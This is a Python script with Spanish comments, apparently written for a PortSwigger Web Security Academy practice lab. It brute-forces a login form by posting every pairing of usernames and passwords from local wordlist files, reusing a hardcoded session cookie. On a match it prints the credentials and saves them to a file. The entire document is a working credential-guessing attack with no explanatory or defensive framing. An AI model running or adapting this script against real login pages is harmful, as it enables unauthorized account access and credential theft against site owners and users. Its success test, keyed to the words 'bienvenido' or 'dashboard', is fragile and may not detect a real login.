import requests
import time
import sys

with open('/home/maximo/Documents/Programming/Python_Practice/username.txt', 'r') as user_file:
    usernames = [line.strip() for line in user_file if line.strip()]

with open('/home/maximo/Documents/Programming/Python_Practice/password.txt', 'r') as pass_file:
    passwords = [line.strip() for line in pass_file if line.strip()]

cookies = {
    "session": "OL7k5pQMW1MjKeolR8uDEav5iyK2FWp7",
}

url = "https://0ae600310459bbf580f16c5d00870036.web-security-academy.net/login"

DELAY = 0.5
TIMEOUT = 6

print(f"Iniciando ataque...")

count = 0
ruta_archivo = "/home/maximo/Documents/credenciales.txt"

for username in usernames:
    for password in passwords:
        count += 1

        data = {
            "username": username,
            "password": password
        }

        if count % 10 == 0:
            print(f"Intentos realizados: {count}")
        print(f"Probando: {username}:{password}")
        
        try:
            response = requests.post(url, data=data, cookies=cookies, timeout=TIMEOUT)

            # Verificar si el login fue exitoso
            if response.status_code == 200:
                if "bienvenido" in response.text.lower() or "dashboard" in response.text.lower():
                    print(f"se encontro: Usuario: {username}, Contraseña: {password}")
                    with open(ruta_archivo, 'w') as f:
                        f.write(f"Usuario: {username}\nContraseña: {password}")
                    sys.exit(0)  
                    
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(DELAY)

print("Proceso completado")